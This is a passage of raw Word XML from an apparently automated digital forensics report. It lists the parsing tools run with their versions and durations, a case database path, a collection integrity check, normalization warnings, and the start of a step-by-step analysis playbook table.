            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>9 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd - Kroll batch (all hives)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0; RECmd_KrollBatch latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>14 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SBECmd - ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SBECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SIDR - Windows Search index</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr v0.9.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>0 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sqlecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SQLECmd - SQLite databases (browsers, notifications...)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SQLECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>3 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd - SRUM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Suricata - network captures (alerts and protocol metadata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata Suricata 8.0.7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>19 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3 - memory image (58 plugins, no secrets, no file extraction)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>vol volatility3 2.28.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1963 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>WxTCmd - Windows Timeline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>WxTCmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>3 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Zircolite - Sigma detections</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>zircolite v4.6.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>5 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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Analysis database</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\db\case.duckdb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Pipeline version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>commit 9615b51f9227; content sha256 507779379B984D32; deployed 2026-10-21 08:56</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Collection integrity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>INTACT: 2703 file(s) matching the SHA-1 recorded by KAPE, 0 different, 0 missing, 0 without KAPE hash, 0 expected difference(s) on files copied live in raw mode (checked on 2026-10-25T20:16:47+01:00)</w:t>
              <w:br/>
              <w:t>After parsing: no collection file modified by parsing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Normalization</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>normalize.py v1.1 on 2026-10-25T19:35:54Z; mappings v2.2 (sha256 8a32b59741d3439e…)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Normalization warnings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>logfileparser/LogFile_2026-10-25_20-17-41/LogFile_Mft_ObjectId_Entries.csv: 10 rows not matching the header re-read in lenient mode (extra values in columnNN columns, missing values set to NULL)</w:t>
              <w:br/>
              <w:t>odl/odl_Admin_Personal.csv: re-read with Python's csv module (format irregular for DuckDB); 4660 blank rows skipped; _src_row = number of the non-blank record</w:t>
              <w:br/>
              <w:t>odl/odl_Administrator_Personal.csv: re-read with Python's csv module (format irregular for DuckDB); 1895 blank rows skipped; _src_row = number of the non-blank record</w:t>
              <w:br/>
              <w:t>odl/odl_mortysmith_Personal.csv: re-read with Python's csv module (format irregular for DuckDB); 3249 blank rows skipped; _src_row = number of the non-blank record</w:t>
              <w:br/>
              <w:t>odl/odl_ricksanchez_Personal.csv: re-read with Python's csv module (format irregular for DuckDB); 3774 blank rows skipped; _src_row = number of the non-blank record</w:t>
              <w:br/>
              <w:t>Local time -&gt; UTC: ActiveTimeBias = 420 min (value at collection time; a daylight saving change during the period is not taken into account).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Normalization errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Outputs without a validated mapping</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 Methodology</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The analysis follows the playbook below (PLAYBOOK.md), one step at a time. At each step, the agent queries the read-only database, correlates the sources and records a finding only if all its evidence references exist in the database (automatic check). Artifact dates are interpreted according to their evidential value (e.g. ShimCache = presence, Prefetch = execution).</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="737"/>
        <w:gridCol w:w="5102"/>
        <w:gridCol w:w="1417"/>
        <w:gridCol w:w="1247"/>
        <w:gridCol w:w="1134"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Step</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Tool calls</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Duration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>System context and scope</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>136 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Triage of automatic detections</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>185 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Program execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>180 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Memory (RAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>done</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>154 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
